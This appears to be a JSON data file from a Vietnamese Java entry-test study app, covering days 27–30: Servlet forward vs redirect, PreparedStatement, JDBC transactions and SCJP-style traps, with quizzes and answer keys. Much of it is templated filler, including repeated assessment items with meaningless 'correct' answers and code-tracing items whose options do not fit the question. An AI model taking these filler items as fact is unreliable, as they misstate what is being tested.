            "URL trình duyệt đổi sang page2.jsp",
            "Attribute 'user' bị mất khi sang page2.jsp",
            "Ném IllegalStateException ngay dòng forward"
          ],
          "correctIndex": 0,
          "explanation": "`RequestDispatcher.forward()` là cơ chế điều phối nội bộ phía Server. Trình duyệt không biết có sự chuyển trang nên URL trên thanh địa chỉ giữ nguyên, và đối tượng `request` được chuyển tiếp sang trang đích nên `request.getAttribute(\"user\")` đọc được bình thường."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: Quên chain.doFilter trong Filter sẽ làm request bị nghẽn lại vĩnh viễn.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// Forward (Server-side)\nrequest.getRequestDispatcher(\"home.jsp\").forward(request, response);\n\n// Redirect (Client-side)\nresponse.sendRedirect(\"login.jsp\");",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        },
        {
          "trap": "Cạm bẫy 2: Dùng sendRedirect sẽ làm mất toàn bộ request.setAttribute đã gắn.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// Forward (Server-side)\nrequest.getRequestDispatcher(\"home.jsp\").forward(request, response);\n\n// Redirect (Client-side)\nresponse.sendRedirect(\"login.jsp\");",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Forward vs Redirect & PreparedStatement",
          "questions": [
            {
              "q": "Phân biệt `RequestDispatcher.forward()` và `HttpServletResponse.sendRedirect()`.",
              "ans": "`forward()`: Diễn ra hoàn toàn phía Server, URL trên trình duyệt không đổi, giữ nguyên dữ liệu trong Request scope (1 round-trip). `sendRedirect()`: Server trả mã 302 về trình duyệt yêu cầu client gửi request mới, URL bị đổi, mất dữ liệu request cũ (2 round-trips)."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "PreparedStatement chống SQL Injection",
          "questions": [
            {
              "q": "Tại sao `PreparedStatement` ngăn chặn được tấn công SQL Injection?",
              "ans": "Vì khung câu lệnh SQL được biên dịch trước (pre-compiled) trong database engine. Mọi giá trị tham số truyền vào qua hàm `setXxx()` đều được CSDL xem thuần túy là dữ liệu thô (literal data), không thể làm thay đổi cấu trúc cú pháp của lệnh SQL."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace index tham số trong PreparedStatement",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nString sql = \"INSERT INTO Users(name, age) VALUES(?, ?)\";\nPreparedStatement ps = conn.prepareStatement(sql);\nps.setString(1, \"Alice\");\nps.setInt(2, 25);\n```\nChỉ số tham số (parameter index) trong JDBC bắt đầu từ số mấy?",
              "ans": "Bắt đầu từ số `1` (1-indexed), không phải 0 như mảng Java! Nếu truyền `ps.setString(0, ...)` sẽ gây ra ngoại lệ `SQLException: Parameter index out of range`."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy đóng Connection sau khi dùng",
          "questions": [
            {
              "q": "Chuyện gì xảy ra nếu lập trình viên không đóng `Connection` và `ResultSet` trong khối `finally` hoặc không dùng `try-with-resources`?",
              "ans": "Sẽ gây ra lỗi rò rỉ kết nối (Connection Leak), cạn kiệt Connection Pool của ứng dụng và khiến máy chủ ngừng tiếp nhận thêm các request CSDL mới."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Quản lý Transaction thủ công trong JDBC",
          "questions": [
            {
              "q": "Để quản lý Transaction thủ công trong JDBC, bước đầu tiên phải làm gì trên đối tượng `Connection`?",
              "ans": "Bắt buộc phải gọi `conn.setAutoCommit(false);` để tắt chế độ tự động commit, sau đó dùng `conn.commit();` khi thành công và `conn.rollback();` trong khối catch nếu xảy ra lỗi."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_27_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề RequestDispatcher.forward() vs HttpServletResponse.sendRedirect()?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của RequestDispatcher.forward() vs HttpServletResponse.sendRedirect() phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần RequestDispatcher.forward() vs HttpServletResponse.sendRedirect()."
        },
        {
          "id": "da_27_2",
          "q": "Khi thao tác với RequestDispatcher.forward() vs HttpServletResponse.sendRedirect(), lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "So sánh cơ chế hoạt động của `RequestDispatcher.forward()` và `HttpServletResponse.sendRedirect()`?",
          "a": "- `forward()`: Chuyển tiếp ở phía Server, URL trên trình duyệt GIỮ NGUYÊN, dữ liệu trong `request.setAttribute` được bảo toàn.\n- `sendRedirect()`: Trả về HTTP 302 cho Client để Browser tự gửi Request GET MỚI sang URL mới, URL trên thanh địa chỉ THAY ĐỔI, request attribute cũ bị mất.",
          "trap": "Sau forward dữ liệu form vẫn còn, sau redirect là một request hoàn toàn mới!"
        }
      ],
      "dailyEnglish": [
        {
          "id": 79,
          "vi": "Nếu giá trị nhập vào của item A là xxx thì hãy chuyển đổi thành yyy, sau đó đăng kí vào database với định dạng zzz.",
          "en": "If inputted value of item A is xxx, convert to yyy, then register into database with zzz format."
        },
        {
          "id": 1,
          "vi": "Lấy danh sách các trận đấu",
          "en": "Get list of matches"
        },
        {
          "id": 2,
          "vi": "Thực hiện xóa các trận đấu",
          "en": "Delete matches"
        },
        {
          "id": 3,
          "vi": "Tìm kiếm các trận đấu theo ngày giờ",
          "en": "Search matches by time"
        },
        {
          "id": 4,
          "vi": "Thực hiện thêm các trận đấu",
          "en": "Add matches"
        }
      ]
    },
    "28": {
      "day": 28,
      "week": 4,
      "title": "Full Mock Entry Test #1 (Java + SQL + Web)",
      "topics": [
        "Thi thử format chuẩn Entry Test"
      ],
      "tasks": [
        "Làm đề thi thử 25 câu: 15 Java Core, 5 SQL, 5 JavaWeb",
        "Bấm giờ 40 phút",
        "Đánh giá điểm từng phần và lưu kết quả"
      ],
      "englishDrill": [
        {
          "id": 3,
          "vi": "Tìm kiếm các trận đấu theo ngày giờ",
          "en": "Search matches by time"
        },
        {
          "id": 4,
          "vi": "Thực hiện thêm các trận đấu",
          "en": "Add matches"
        },
        {
          "id": 5,
          "vi": "(Kiểm tra [var] có tồn tại hay không )",
          "en": "Check if [var] exists"
        },
        {
          "id": 6,
          "vi": "return true if [var] exist or false if not exist (Trả về \"true\" nếu [var] tồn tại hoặc \"false\"nếu [var] không tồn tại",
          "en": "Return \"True\" if [var] exists or false if [var] does not exist"
        },
        {
          "id": 7,
          "vi": "(Lấy số ngày nghỉ của một tháng)",
          "en": "Get number of days off of a month"
        }
      ],
      "summary": "FULL MOCK ENTRY TEST #1 (Format chuẩn 25 câu: Java Core + SQL + JavaWeb).",
      "coreTheory": "\n### Cấu trúc đề thi Entry Test:\n- 15 câu Java Core (Ch1-Ch9).\n- 5 câu SQL (JOIN, GROUP BY, HAVING, DDL/DML).\n- 5 câu JavaWeb (Servlet lifecycle, scopes, forward vs redirect).\n- Thời gian làm bài: 40 phút nghiêm ngặt.\n",
      "codeSnippet": "// Bắt đầu thi trên tab Quiz (Mock Exam Mode)",
      "traps": [
        "Phân bổ thời gian: tối đa 90 giây cho mỗi câu hỏi."
      ],
      "quickQuiz": [
        {
          "q": "Trong JDBC, tại sao `PreparedStatement` lại chống được lỗi SQL Injection so với `Statement` thông thường?",
          "a": "Vì PreparedStatement biên dịch trước (pre-compile) khung câu lệnh SQL trong DB engine. Mọi giá trị truyền qua dấu hỏi `?` đều được xem là tham số dữ liệu (literal value), không thể làm thay đổi cấu trúc cú pháp của lệnh SQL."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟠 HIGH (SQL & Web & TestKing)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Thi thử format chuẩn Entry Test.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### Cấu trúc đề thi Entry Test:\n- 15 câu Java Core (Ch1-Ch9).\n- 5 câu SQL (JOIN, GROUP BY, HAVING, DDL/DML).\n- 5 câu JavaWeb (Servlet lifecycle, scopes, forward vs redirect).\n- Thời gian làm bài: 40 phút nghiêm ngặt.\n",
          "code": "// Bắt đầu thi trên tab Quiz (Mock Exam Mode)"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_28_1",
          "level": "Easy",
          "question": "Mục tiêu đạt được hôm nay:",
          "code": "// Bắt đầu thi trên tab Quiz (Mock Exam Mode)",
          "options": [
            "Đúng theo dự đoán",
            "Compile Error",
            "Runtime Exception",
            "Khác"
          ],
          "correctIndex": 0,
          "explanation": "Tối thiểu 18/25 câu đúng."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: Phân bổ thời gian: tối đa 90 giây cho mỗi câu hỏi.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// Bắt đầu thi trên tab Quiz (Mock Exam Mode)",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Tổng hợp Web & Database",
          "questions": [
            {
              "q": "Mã trạng thái HTTP 200, 302, 404, 500 biểu thị ý nghĩa gì?",
              "ans": "200: OK (Thành công); 302: Found (Chuyển hướng Redirect); 404: Not Found (Không tìm thấy tài nguyên phía Client); 500: Internal Server Error (Lỗi logic crash phía Server)."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Nguyên lý ACID trong CSDL",
          "questions": [
            {
              "q": "Nêu ý nghĩa của 4 chữ cái trong thuộc tính ACID của hệ quản trị CSDL.",
              "ans": "A (Atomicity): Tính nguyên tử - Tất cả hoặc không gì cả. C (Consistency): Tính nhất quán - Dữ liệu luôn đúng ràng buộc. I (Isolation): Tính cô lập - Các giao dịch không ảnh hưởng lẫn nhau. D (Durability): Tính bền vững - Dữ liệu đã commit sẽ tồn tại vĩnh viễn dù mất điện."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace Transaction Rollback",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nconn.setAutoCommit(false);\nstmt.executeUpdate(\"INSERT INTO Accounts VALUES(1, 100)\");\nSavepoint sp = conn.setSavepoint();\nstmt.executeUpdate(\"INSERT INTO Accounts VALUES(2, 200)\");\nconn.rollback(sp);\nconn.commit();\n```\nSau khi chạy, bảng `Accounts` có bao nhiêu bản ghi?",
              "ans": "Có duy nhất 1 bản ghi (Account 1)! Lệnh `rollback(sp)` đã hoàn tác bản ghi 2 về mốc Savepoint, sau đó lệnh `commit()` lưu lại toàn bộ các thao tác trước mốc Savepoint đó."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy forward sau khi response đã committed",
          "questions": [
            {
              "q": "Nếu Servlet đã gọi `response.getWriter().flush()` rồi sau đó mới gọi `dispatcher.forward(req, resp)`, ngoại lệ nào sẽ xảy ra?",
              "ans": "Ném ngoại lệ `java.lang.IllegalStateException: Cannot forward after response has been committed`. Một khi header và nội dung phản hồi đã được gửi về client, không thể thực hiện forward nữa."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Transaction Isolation Levels và hiện tượng Phantom Read",
          "questions": [
            {
              "q": "Hiện tượng Phantom Read (dòng dữ liệu ma) là gì và mức cô lập nào ngăn chặn được nó?",
              "ans": "Phantom Read xảy ra khi giao dịch 1 truy vấn một tập bản ghi theo điều kiện, giao dịch 2 chèn thêm bản ghi mới thỏa điều kiện đó và commit, giao dịch 1 đọc lại thấy xuất hiện thêm bản ghi mới. Mức cô lập `SERIALIZABLE` ngăn chặn được hiện tượng này."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_28_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề Thi thử format chuẩn Entry Test?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của Thi thử format chuẩn Entry Test phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần Thi thử format chuẩn Entry Test."
        },
        {
          "id": "da_28_2",
          "q": "Khi thao tác với Thi thử format chuẩn Entry Test, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Lợi ích vượt trội của `PreparedStatement` so với `Statement` thông thường trong JDBC?",
          "a": "1. Chống tấn công SQL Injection nhờ cơ chế tách biệt câu lệnh SQL và tham số qua Placeholder `?`.\n2. Tăng tốc độ thực thi nhờ Database biên dịch sẵn (Pre-compiled) kế hoạch thực thi cho các lần gọi lặp lại.",
          "trap": "Nối chuỗi câu lệnh SQL với Statement thông thường là lỗ hổng bảo mật nghiêm trọng số 1!"
        }
      ],
      "dailyEnglish": [
        {
          "id": 3,
          "vi": "Tìm kiếm các trận đấu theo ngày giờ",
          "en": "Search matches by time"
        },
        {
          "id": 4,
          "vi": "Thực hiện thêm các trận đấu",
          "en": "Add matches"
        },
        {
          "id": 5,
          "vi": "(Kiểm tra [var] có tồn tại hay không )",
          "en": "Check if [var] exists"
        },
        {
          "id": 6,
          "vi": "return true if [var] exist or false if not exist (Trả về \"true\" nếu [var] tồn tại hoặc \"false\"nếu [var] không tồn tại",
          "en": "Return \"True\" if [var] exists or false if [var] does not exist"
        },
        {
          "id": 7,
          "vi": "(Lấy số ngày nghỉ của một tháng)",
          "en": "Get number of days off of a month"
        }
      ]
    },
    "29": {
      "day": 29,
      "week": 5,
      "title": "TestKing Marathon Part 1 (Câu 1 - 40)",
      "topics": [
        "Language Fundamentals, Operators, Arrays",
        "Quy trình: Làm câu -> Chọn đáp án -> Tự giải thích -> Kiểm tra -> Nếu sai viết ví dụ phản chứng"
      ],
      "tasks": [
        "Hoàn thành 40 câu TestKing đầu tiên",
        "Ghi chú ít nhất 5 bẫy vào Error Notebook"
      ],
      "englishDrill": [
        {
          "id": 6,
          "vi": "return true if [var] exist or false if not exist (Trả về \"true\" nếu [var] tồn tại hoặc \"false\"nếu [var] không tồn tại",
          "en": "Return \"True\" if [var] exists or false if [var] does not exist"
        },
        {
          "id": 7,
          "vi": "(Lấy số ngày nghỉ của một tháng)",
          "en": "Get number of days off of a month"
        },
        {
          "id": 8,
          "vi": "(Lấy các tháng của năm)",
          "en": "Get months of year"
        },
        {
          "id": 9,
          "vi": "(Lấy tất cả dữ liệu về ngày nghỉ của các tháng và các năm trong database)",
          "en": "Get all days off of months and years from database"
        },
        {
          "id": 10,
          "vi": "Xóa tất cả ngày nghỉ của một tháng",
          "en": "Delete all days off of a month"
        }
      ],
      "summary": "TestKing Marathon Đợt 1: Cày 40-50 câu/ngày, đọc code phát hiện bẫy cú pháp.",
      "coreTheory": "\n### Quy trình cày TestKing chuẩn phản xạ:\n1. Đọc kỹ câu hỏi, **tuyệt đối không xem đáp án trước**.\n2. Phân tích: Đoạn code này compile được không? Dòng nào có nguy cơ lỗi?\n3. Nếu compile được: Output là gì? Có ném exception lúc chạy không?\n4. Chọn đáp án -> Kiểm tra -> Nếu sai, ghi ngay vào **Error Notebook**.\n5. Tự viết 1 ví dụ code tương tự trên IDE để chứng minh tại sao đáp án đó đúng.\n",
      "codeSnippet": "// TestKing Code Tracing Practice",
      "traps": [
        "Học thuộc đáp án sẽ thất bại nếu đề thi thật chỉ cần đổi 1 dấu chấm phẩy hoặc toán tử ++."
      ],
      "quickQuiz": [
        {
          "q": "Biến local variable kiểu `int x;` nếu không gán giá trị mà đem in ra màn hình thì JVM xử lý thế nào?",
          "a": "Bị Compile Error: `variable x might not have been initialized`. Biến cục bộ nằm trên Stack không được JVM gán giá trị mặc định."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟠 HIGH (SQL & Web & TestKing)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Language Fundamentals, Operators, Arrays, Quy trình: Làm câu -> Chọn đáp án -> Tự giải thích -> Kiểm tra -> Nếu sai viết ví dụ phản chứng.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### Quy trình cày TestKing chuẩn phản xạ:\n1. Đọc kỹ câu hỏi, **tuyệt đối không xem đáp án trước**.\n2. Phân tích: Đoạn code này compile được không? Dòng nào có nguy cơ lỗi?\n3. Nếu compile được: Output là gì? Có ném exception lúc chạy không?\n4. Chọn đáp án -> Kiểm tra -> Nếu sai, ghi ngay vào **Error Notebook**.\n5. Tự viết 1 ví dụ code tương tự trên IDE để chứng minh tại sao đáp án đó đúng.\n",
          "code": "// TestKing Code Tracing Practice"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_29_1",
          "level": "Easy",
          "question": "Hôm nay cần hoàn thành bao nhiêu câu TestKing?",
          "code": "// TestKing Code Tracing Practice",
          "options": [
            "Đúng theo dự đoán",
            "Compile Error",
            "Runtime Exception",
            "Khác"
          ],
          "correctIndex": 0,
          "explanation": "40 - 50 câu không nhìn đáp án."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: Học thuộc đáp án sẽ thất bại nếu đề thi thật chỉ cần đổi 1 dấu chấm phẩy hoặc toán tử ++.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// TestKing Code Tracing Practice",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Bẫy từ khóa và kiểu nguyên thủy TestKing Ch1",
          "questions": [
            {
              "q": "Trong các định danh: `goto`, `const`, `default`, `assert`, từ nào là từ khóa hợp lệ trong Java hiện đại?",
              "ans": "Tất cả đều là từ khóa! Trong đó `goto` và `const` là các từ khóa dành riêng (reserved keywords) không dùng trong cú pháp, `default` và `assert` là từ khóa có chức năng."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Tràn số nguyên khi cast",
          "questions": [
            {
              "q": "Tại sao `int i = 130; byte b = (byte) i;` lại cho giá trị `b = -126`?",
              "ans": "130 trong nhị phân 32-bit là `00000000 00000000 00000000 10000010`. Khi ép kiểu sang `byte` (8-bit), nó cắt lấy 8 bit cuối: `10000010`. Bit đầu là 1 biểu thị số âm, lấy bù hai ta được giá trị là `-126`."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace mảng đa chiều không đồng đều (Jagged Array)",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nint[][] arr = new int[2][];\narr[0] = new int[]{1, 2};\narr[1] = new int[]{3, 4, 5};\nSystem.out.println(arr[1].length + \" \" + arr[0][1]);\n```\nKết quả in ra là gì?",
              "ans": "In ra: `3 2`. Java hỗ trợ mảng lởm chởm (ragged/jagged array): `arr[1]` có 3 phần tử nên `length` là 3. `arr[0][1]` truy cập phần tử thứ hai của mảng thứ nhất có giá trị 2."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy khai báo mảng sai cú pháp",
          "questions": [
            {
              "q": "Câu lệnh nào sau đây bị lỗi biên dịch: `int[] a;`, `int a[];`, `int[5] a;`?",
              "ans": "`int[5] a;` bị lỗi Compile Error! Trong Java, kích thước mảng không bao giờ được đặt ở phần khai báo biến kiểu dữ liệu."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Dấu gạch dưới trong số thực và số nguyên (Java 7+)",
          "questions": [
            {
              "q": "Khai báo `int x = 1_000_000;` và `int y = _100;` câu nào bị lỗi biên dịch?",
              "ans": "`int y = _100;` bị lỗi biên dịch vì coi `_100` là một tên biến không xác định. Dấu gạch dưới `_` chỉ được đặt GIỮA các chữ số, không được đặt ở đầu, ở cuối hoặc cạnh dấu chấm số thập phân."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_29_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề Language Fundamentals, Operators, Arrays?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của Language Fundamentals, Operators, Arrays phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần Language Fundamentals, Operators, Arrays."
        },
        {
          "id": "da_29_2",
          "q": "Khi thao tác với Language Fundamentals, Operators, Arrays, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Quy tắc đặt tên Identifier (tên biến, hàm, class) hợp lệ trong Java?",
          "a": "Identifier có thể chứa chữ cái, chữ số, dấu gạch dưới `_` và ký tự `$`. TUYỆT ĐỐI KHÔNG ĐƯỢC bắt đầu bằng chữ số, không chứa dấu gạch ngang `-`, không chứa dấu cách và không được trùng với các từ khóa (keywords) của Java.",
          "trap": "`int $1_value;` là hợp lệ, nhưng `int 1_value;` hoặc `int my-var;` là Compile Error!"
        }
      ],
      "dailyEnglish": [
        {
          "id": 6,
          "vi": "return true if [var] exist or false if not exist (Trả về \"true\" nếu [var] tồn tại hoặc \"false\"nếu [var] không tồn tại",
          "en": "Return \"True\" if [var] exists or false if [var] does not exist"
        },
        {
          "id": 7,
          "vi": "(Lấy số ngày nghỉ của một tháng)",
          "en": "Get number of days off of a month"
        },
        {
          "id": 8,
          "vi": "(Lấy các tháng của năm)",
          "en": "Get months of year"
        },
        {
          "id": 9,
          "vi": "(Lấy tất cả dữ liệu về ngày nghỉ của các tháng và các năm trong database)",
          "en": "Get all days off of months and years from database"
        },
        {
          "id": 10,
          "vi": "Xóa tất cả ngày nghỉ của một tháng",
          "en": "Delete all days off of a month"
        }
      ]
    },
    "30": {
      "day": 30,
      "week": 5,
      "title": "TestKing Marathon Part 2 (Câu 41 - 80)",
      "topics": [
        "Declarations, Access modifiers, Abstract classes, Interfaces"
      ],
      "tasks": [
        "Hoàn thành 40 câu TestKing tiếp theo",
        "Review lại bảng Access modifiers"
      ],
      "englishDrill": [
        {
          "id": 9,
          "vi": "(Lấy tất cả dữ liệu về ngày nghỉ của các tháng và các năm trong database)",
          "en": "Get all days off of months and years from database"
        },
        {
          "id": 10,
          "vi": "Xóa tất cả ngày nghỉ của một tháng",
          "en": "Delete all days off of a month"
        },
        {
          "id": 11,
          "vi": "(Trả về true nếu thành công hoặc false nếu thất bại",
          "en": "Return \"true\" on success or \"false\" on failure"
        },
        {
          "id": 12,
          "vi": "(Đăng ký hoặc update ngày nghỉ của một tháng)",
          "en": "Register or update days off of a month"
        },
        {
          "id": 13,
          "vi": "(Lấy danh sách ngày nghỉ của một tháng)",
          "en": "Get list of days off of a month"
        }
      ],
      "summary": "TestKing Marathon Đợt 2: Cày 40-50 câu/ngày, đọc code phát hiện bẫy cú pháp.",
      "coreTheory": "\n### Quy trình cày TestKing chuẩn phản xạ:\n1. Đọc kỹ câu hỏi, **tuyệt đối không xem đáp án trước**.\n2. Phân tích: Đoạn code này compile được không? Dòng nào có nguy cơ lỗi?\n3. Nếu compile được: Output là gì? Có ném exception lúc chạy không?\n4. Chọn đáp án -> Kiểm tra -> Nếu sai, ghi ngay vào **Error Notebook**.\n5. Tự viết 1 ví dụ code tương tự trên IDE để chứng minh tại sao đáp án đó đúng.\n",
      "codeSnippet": "// TestKing Code Tracing Practice",
      "traps": [
        "Học thuộc đáp án sẽ thất bại nếu đề thi thật chỉ cần đổi 1 dấu chấm phẩy hoặc toán tử ++."
      ],
      "quickQuiz": [
        {
          "q": "Có thể khai báo phương thức `abstract` đi kèm với từ khóa `static` hoặc `final` hoặc `private` không?",
          "a": "Không bao giờ! `abstract` bắt buộc phải override, trong khi `static`, `final`, `private` đều cấm/không cho phép override -> Compile Error ngay lập tức."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟠 HIGH (SQL & Web & TestKing)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Declarations, Access modifiers, Abstract classes, Interfaces.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### Quy trình cày TestKing chuẩn phản xạ:\n1. Đọc kỹ câu hỏi, **tuyệt đối không xem đáp án trước**.\n2. Phân tích: Đoạn code này compile được không? Dòng nào có nguy cơ lỗi?\n3. Nếu compile được: Output là gì? Có ném exception lúc chạy không?\n4. Chọn đáp án -> Kiểm tra -> Nếu sai, ghi ngay vào **Error Notebook**.\n5. Tự viết 1 ví dụ code tương tự trên IDE để chứng minh tại sao đáp án đó đúng.\n",
          "code": "// TestKing Code Tracing Practice"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_30_1",
          "level": "Easy",
          "question": "Hôm nay cần hoàn thành bao nhiêu câu TestKing?",
          "code": "// TestKing Code Tracing Practice",
          "options": [
            "Đúng theo dự đoán",
            "Compile Error",
            "Runtime Exception",
            "Khác"
          ],
          "correctIndex": 0,
          "explanation": "40 - 50 câu không nhìn đáp án."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: Học thuộc đáp án sẽ thất bại nếu đề thi thật chỉ cần đổi 1 dấu chấm phẩy hoặc toán tử ++.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
